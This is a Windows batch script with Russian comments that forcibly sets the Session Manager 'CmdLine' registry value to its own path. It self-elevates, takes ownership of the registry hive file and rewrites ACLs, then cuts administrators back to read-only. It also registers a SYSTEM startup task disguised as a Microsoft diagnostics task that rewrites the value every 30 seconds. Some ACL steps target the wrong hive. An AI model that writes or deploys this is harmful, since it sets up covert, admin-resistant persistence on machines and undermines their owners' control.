@echo off
setlocal enabledelayedexpansion

:: ============================================
:: ПОЛУЧЕНИЕ ПРАВ АДМИНИСТРАТОРА (MANDATORY)
:: ============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Запрос прав администратора...
    powershell start-process cmd -verb runas -argumentlist "/c ""%~f0"""
    exit /b
)
cd /d "%~dp0"

:: ============================================
:: ПЕРЕМЕННЫЕ
:: ============================================
set "SCRIPT=%~f0"
set "KEY=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
set "VALUE=CmdLine"
set "TEMP_REG=%temp%\takeown_env.reg"

echo ================================================
echo    ПРИНУДИТЕЛЬНАЯ СМЕНА CmdLine
echo ================================================
echo.

:: ============================================
:: ШАГ 1. ЗАБИРАЕМ ВЛАДЕНИЕ У TRUSTEDINSTALLER
:: ============================================
echo [1] Перехват владения у TrustedInstaller...
takeown /f "%SystemRoot%\System32\config\SOFTWARE" /a >nul 2>&1

:: Применяем владение на конкретный ключ через regini
(
echo \%KEY:\=\\%
echo     Administrators [1 5 7 11 17 21]
echo     SYSTEM [1 5 7 11 17 21]
) > "%temp%\regini.ini"

regini "%temp%\regini.ini" >nul 2>&1
del "%temp%\regini.ini" 2>nul
timeout /t 1 /nobreak >nul

:: ============================================
:: ШАГ 2. ВЫДАЁМ СЕБЕ ПОЛНЫЙ ДОСТУП
:: ============================================
echo [2] Выдача полного доступа Администраторам...
icacls "%SystemRoot%\System32\config\SOFTWARE" /grant "Administrators:(F)" /t >nul 2>&1
icacls "%SystemRoot%\System32\config\SOFTWARE" /grant "SYSTEM:(F)" /t >nul 2>&1

:: ============================================
:: ШАГ 3. ЭКСПОРТИРУЕМ ТЕКУЩЕЕ ЗНАЧЕНИЕ (БЭКАП)
:: ============================================
echo [3] Создание резервной копии...
reg export "%KEY%" "%TEMP_REG%" /y >nul 2>&1
echo Бэкап: %TEMP_REG%

:: ============================================
:: ШАГ 4. УСТАНАВЛИВАЕМ НАШЕ ЗНАЧЕНИЕ
:: ============================================
echo [4] Установка нового значения CmdLine...
reg add "%KEY%" /v "%VALUE%" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1

if %errorlevel% equ 0 (
    echo [✓] CmdLine успешно изменён!
) else (
    echo [✗] Первая попытка не удалась. Пробуем обход...
    :: Метод через удаление и создание заново
    reg delete "%KEY%" /v "%VALUE%" /f >nul 2>&1
    reg add "%KEY%" /v "%VALUE%" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
)

:: ============================================
:: ШАГ 5. ВОЗВРАЩАЕМ ВЛАДЕЛЬЦА TRUSTEDINSTALLER (ВАЖНО!)
:: ============================================
echo [5] Восстановление владельца TrustedInstaller...
set "TI_SID=S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"

:: Устанавливаем владельца обратно на TrustedInstaller
powershell -Command "$path = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment'; $acl = Get-Acl $path; $owner = 'NT SERVICE\TrustedInstaller'; $acl.SetOwner([System.Security.Principal.NTAccount]$owner); Set-Acl $path $acl" >nul 2>&1

:: Убираем права на запись у администраторов (оставляем чтение)
icacls "%SystemRoot%\System32\config\SOFTWARE" /remove:g "Administrators" >nul 2>&1
icacls "%SystemRoot%\System32\config\SOFTWARE" /grant "Administrators:(R)" >nul 2>&1
icacls "%SystemRoot%\System32\config\SOFTWARE" /grant "SYSTEM:(F)" >nul 2>&1

:: ============================================
:: ШАГ 6. ПРОВЕРКА
:: ============================================
echo.
echo [6] Проверка текущего значения:
reg query "%KEY%" /v "%VALUE%" 2>nul | find "%SCRIPT%" >nul
if %errorlevel% equ 0 (
    echo [✓] ЗНАЧЕНИЕ УСТАНОВЛЕНО И ЗАЩИЩЕНО
    echo     %VALUE% = %SCRIPT%
) else (
    echo [✗] НЕ УДАЛОСЬ ИЗМЕНИТЬ
)

:: ============================================
:: ШАГ 7. ЗАЩИТА ОТ ИЗМЕНЕНИЙ (WATCHDOG)
:: ============================================
echo.
echo [7] Установка защитника CmdLine...

:: Создаём задачу в планировщике от SYSTEM (неубиваемо)
(
echo @echo off
echo setlocal enabledelayedexpansion
echo set "TARGET_KEY=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
echo set "VALUE_NAME=CmdLine"
echo set "REQUIRED_VALUE=%~f0"
echo :loop
echo reg query "!TARGET_KEY!" /v "!VALUE_NAME!" 2^>nul ^| find "!REQUIRED_VALUE!" ^>nul
echo if errorlevel 1 ^(
echo     reg add "!TARGET_KEY!" /v "!VALUE_NAME!" /t REG_SZ /d "!REQUIRED_VALUE!" /f ^>nul 2^>^&1
echo ^)
echo timeout /t 30 /nobreak ^>nul
echo goto loop
) > "%SystemRoot%\Temp\CmdLineGuard.bat"

:: Регистрируем как задачу с наивысшими привилегиями
schtasks /create /tn "Microsoft\Windows\Diagnosis\CmdLineProtector" /tr "%SystemRoot%\Temp\CmdLineGuard.bat" /sc onstart /ru "SYSTEM" /f >nul 2>&1
schtasks /run /tn "Microsoft\Windows\Diagnosis\CmdLineProtector" >nul 2>&1

echo [✓] Защитник активирован (восстановление каждые 30 сек)

:: ============================================
:: ФИНАЛ
:: ============================================
echo.
echo ================================================
echo    ОПЕРАЦИЯ ЗАВЕРШЕНА
echo ================================================
echo.
echo Текущее CmdLine: %SCRIPT%
echo Владелец ключа: TrustedInstaller (восстановлен)
echo Администраторы: только чтение
echo.
echo Чтобы проверить вручную:
echo reg query "%KEY%" /v "%VALUE%"
echo.
pause